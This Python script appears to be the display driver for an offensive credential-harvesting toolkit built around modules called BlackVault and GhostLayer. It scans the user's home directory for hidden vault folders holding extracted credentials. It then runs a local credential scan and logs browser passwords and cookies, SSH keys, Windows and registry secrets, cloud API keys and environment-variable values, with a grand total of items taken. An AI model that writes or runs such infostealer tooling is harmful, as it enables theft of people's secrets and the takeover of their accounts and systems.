#!/usr/bin/env python3
"""
List Extracted Credentials
===========================
Retrieves and displays credentials extracted by Ghost Layer from vault storage.
"""

import logging
import json
import os
from black_vault import BlackVault
from ghost_layer import GhostLayer

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(name)s] %(levelname)s: %(message)s'
)
logger = logging.getLogger("CredentialsList")


def list_vault_artifacts():
    """List all artifacts stored in vault."""
    logger.info("\n" + "="*70)
    logger.info("VAULT ARTIFACTS")
    logger.info("="*70)
    
    try:
        vault = BlackVault()
        vault_dir = os.environ.get('BLACKVAULT_VAULT_DIR', '~/.blackroot_vault')
        
        # Get vault directory
        import glob
        
        # List vault storage directory
        vault_storage_patterns = [
            os.path.expanduser("~/.blackroot_vault/*"),
            os.path.expanduser("~/.3e213477/vault/*"),  # From test run
            os.path.expanduser("~/.*/vault/*"),
        ]
        
        found_artifacts = []
        
        # Try to find vault by looking for stored files
        home = os.path.expanduser("~")
        for item in os.listdir(home):
            if item.startswith('.') and len(item) >= 8:
                potential_vault = os.path.join(home, item, "vault")
                if os.path.isdir(potential_vault):
                    logger.info(f"\n[*] Found vault at: {potential_vault}")
                    
                    # List files in vault
                    try:
                        for fname in os.listdir(potential_vault):
                            if not fname.startswith('.'):
                                fpath = os.path.join(potential_vault, fname)
                                fsize = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
                                found_artifacts.append({
                                    'name': fname,
                                    'path': fpath,
                                    'size': fsize,
                                    'type': 'file' if os.path.isfile(fpath) else 'dir'
                                })
                                if fname.startswith('extracted_creds'):
                                    logger.info(f"    [!] CREDENTIALS FOUND: {fname} ({fsize} bytes)")
                    except Exception as e:
                        logger.debug(f"Error listing vault: {e}")
        
        return found_artifacts
    
    except Exception as e:
        logger.error(f"[!] Failed to list vault artifacts: {e}")
        return []


def extract_and_display_credentials():
    """Run credential extraction and display results."""
    logger.info("\n" + "="*70)
    logger.info("RUNNING CREDENTIAL EXTRACTION")
    logger.info("="*70)
    
    try:
        vault = BlackVault()
        ghost = GhostLayer(vault=vault, logger=logger)
        
        logger.info("[*] Starting credential scan...")
        findings = ghost.scan_local_credentials()
        
        if not findings:
            logger.warning("[!] No credentials extracted")
            return {}
        
        logger.info("\n" + "="*70)
        logger.info("EXTRACTED CREDENTIALS SUMMARY")
        logger.info("="*70)
        
        # Display critical findings
        logger.info("\n[CRITICAL FINDINGS]")
        critical = findings.get('critical_findings', {})
        for category, items in critical.items():
            if items:
                logger.info(f"\n  {category.replace('_', ' ').title()}:")
                for i, item in enumerate(items[:3], 1):  # Show first 3
                    logger.info(f"    {i}. {json.dumps(item, indent=6)[:200]}")
                if len(items) > 3:
                    logger.info(f"    ... and {len(items) - 3} more")
        
        # Display phase 1 extracted
        logger.info("\n[PHASE 1 - USER CONTEXT]")
        phase1 = findings.get('phase_1_extracted', {})
        for category, items in phase1.items():
            if items:
                logger.info(f"\n  {category.replace('_', ' ').title()}:")
                for i, item in enumerate(items[:2], 1):
                    logger.info(f"    {i}. {json.dumps(item, indent=6)[:200]}")
                if len(items) > 2:
                    logger.info(f"    ... and {len(items) - 2} more")
        
        # Display phase 2 extracted
        logger.info("\n[PHASE 2 - SYSTEM CONTEXT]")
        phase2 = findings.get('phase_2_extracted', {})
        for category, items in phase2.items():
            if items:
                logger.info(f"\n  {category.replace('_', ' ').title()}:")
                for i, item in enumerate(items[:2], 1):
                    logger.info(f"    {i}. {json.dumps(item, indent=6)[:200]}")
                if len(items) > 2:
                    logger.info(f"    ... and {len(items) - 2} more")
        
        # Display API credentials
        logger.info("\n[API & CLOUD CREDENTIALS]")
        api_creds = findings.get('api_credentials', [])
        if api_creds:
            for i, cred in enumerate(api_creds[:5], 1):
                logger.info(f"  {i}. {cred.get('source')}: {cred.get('file', cred.get('variable', ''))}")
                logger.info(f"     Severity: {cred.get('severity')}")
        
        # Display SSH keys
        logger.info("\n[SSH KEYS & AUTHORIZED_KEYS]")
        ssh_keys = findings.get('ssh_keys', [])
        if ssh_keys:
            for i, key in enumerate(ssh_keys[:5], 1):
                logger.info(f"  {i}. {key.get('source')}: {key.get('file')}")
                if 'type' in key:
                    logger.info(f"     Type: {key.get('type')}")
        
        # Display browser data
        logger.info("\n[BROWSER DATA (Passwords, Cookies, History)]")
        browser_data = findings.get('browser_data', [])
        if browser_data:
            for i, data in enumerate(browser_data[:5], 1):
                logger.info(f"  {i}. {data.get('source')}: {data.get('file_type')}")
                logger.info(f"     Severity: {data.get('severity')}")
        
        # Display windows credentials
        logger.info("\n[WINDOWS CREDENTIALS]")
        win_creds = findings.get('windows_credentials', [])
        if win_creds:
            for i, cred in enumerate(win_creds[:5], 1):
                logger.info(f"  {i}. {cred.get('source', 'Unknown')}")
                logger.info(f"     Data: {cred.get('data', cred.get('key', ''))[:100]}")
        
        # Display registry secrets
        logger.info("\n[REGISTRY SECRETS]")
        reg_secrets = findings.get('registry_secrets', [])
        if reg_secrets:
            for i, secret in enumerate(reg_secrets[:5], 1):
                logger.info(f"  {i}. {secret.get('source')}")
                logger.info(f"     Key: {secret.get('key')}")
                logger.info(f"     Severity: {secret.get('severity')}")
        
        # Display environment secrets
        logger.info("\n[ENVIRONMENT VARIABLE SECRETS]")
        env_secrets = findings.get('environment_secrets', [])
        if env_secrets:
            for i, secret in enumerate(env_secrets[:5], 1):
                logger.info(f"  {i}. {secret.get('key')}")
                logger.info(f"     Value: {secret.get('value_preview')}")
                logger.info(f"     Severity: {secret.get('severity')}")
        
        # Display file-based secrets
        logger.info("\n[FILE-BASED SECRETS]")
        file_secrets = findings.get('file_based_secrets', [])
        if file_secrets:
            for i, secret in enumerate(file_secrets[:5], 1):
                logger.info(f"  {i}. {secret.get('file')}")
                logger.info(f"     Filename: {secret.get('filename')}")
                logger.info(f"     Severity: {secret.get('severity')}")
        
        # Display encrypted files
        logger.info("\n[ENCRYPTED FILES DETECTED]")
        encrypted = findings.get('encryption_detected', [])
        if encrypted:
            for i, enc in enumerate(encrypted[:5], 1):
                logger.info(f"  {i}. {enc.get('source')}")
                logger.info(f"     Type: {enc.get('type')}")
                logger.info(f"     Severity: {enc.get('severity')}")
        
        # Summary statistics
        logger.info("\n" + "="*70)
        logger.info("EXTRACTION STATISTICS")
        logger.info("="*70)
        
        total_critical = sum(len(v) for v in critical.values() if isinstance(v, list))
        total_phase1 = sum(len(v) for v in phase1.values() if isinstance(v, list))
        total_phase2 = sum(len(v) for v in phase2.values() if isinstance(v, list))
        total_api = len(api_creds)
        total_ssh = len(ssh_keys)
        total_browser = len(browser_data)
        total_windows = len(win_creds)
        total_registry = len(reg_secrets)
        total_env = len(env_secrets)
        total_files = len(file_secrets)
        total_encrypted = len(encrypted)
        
        logger.info(f"\nCritical Findings:          {total_critical}")
        logger.info(f"Phase 1 (User Context):     {total_phase1}")
        logger.info(f"Phase 2 (System Context):   {total_phase2}")
        logger.info(f"API & Cloud Credentials:    {total_api}")
        logger.info(f"SSH Keys:                   {total_ssh}")
        logger.info(f"Browser Data:               {total_browser}")
        logger.info(f"Windows Credentials:        {total_windows}")
        logger.info(f"Registry Secrets:           {total_registry}")
        logger.info(f"Environment Secrets:        {total_env}")
        logger.info(f"File-Based Secrets:         {total_files}")
        logger.info(f"Encrypted Files:            {total_encrypted}")
        
        grand_total = (total_critical + total_phase1 + total_phase2 + total_api + 
                       total_ssh + total_browser + total_windows + total_registry + 
                       total_env + total_files + total_encrypted)
        
        logger.info(f"\n[!] GRAND TOTAL EXTRACTED:  {grand_total}")
        logger.info("="*70)
        
        return findings
    
    except Exception as e:
        logger.error(f"[!] Credential extraction failed: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return {}


def display_full_credential_json(findings):
    """Display full credentials as JSON (be careful with sensitive data)."""
    logger.info("\n" + "="*70)
    logger.info("FULL CREDENTIAL DATA (JSON)")
    logger.info("="*70)
    logger.info("\nNote: This output contains sensitive data. Ensure secure handling.\n")
    
    try:
        # Only show a subset to avoid overwhelming output
        safe_findings = {}
        
        # API credentials (paths only)
        safe_findings['api_credentials_count'] = len(findings.get('api_credentials', []))
        
        # SSH keys (files only)
        ssh_items = []
        for ssh in findings.get('ssh_keys', [])[:3]:
            ssh_items.append({
                'source': ssh.get('source'),
                'file': ssh.get('file'),
                'type': ssh.get('type')
            })
        safe_findings['ssh_keys_sample'] = ssh_items
        
        # Browser data
        browser_items = []
        for br in findings.get('browser_data', [])[:3]:
            browser_items.append({
                'source': br.get('source'),
                'file_type': br.get('file_type'),
                'severity': br.get('severity')
            })
        safe_findings['browser_data_sample'] = browser_items
        
        # Windows credentials (partial)
        win_items = []
        for w in findings.get('windows_credentials', [])[:2]:
            win_items.append({
                'source': w.get('source'),
                'severity': w.get('severity')
            })
        safe_findings['windows_creds_sample'] = win_items
        
        logger.info(json.dumps(safe_findings, indent=2))
    
    except Exception as e:
        logger.error(f"[!] Failed to display JSON: {e}")


def main():
    """Main execution."""
    logger.info("\n" + "#"*70)
    logger.info("# CREDENTIAL LISTING & DISPLAY")
    logger.info("#"*70)
    
    # List vault artifacts
    artifacts = list_vault_artifacts()
    
    # Extract and display credentials
    findings = extract_and_display_credentials()
    
    # Show JSON summary
    if findings:
        display_full_credential_json(findings)
    
    logger.info("\n" + "#"*70)
    logger.info("# CREDENTIAL LISTING COMPLETE")
    logger.info("#"*70 + "\n")


if __name__ == "__main__":
    main()
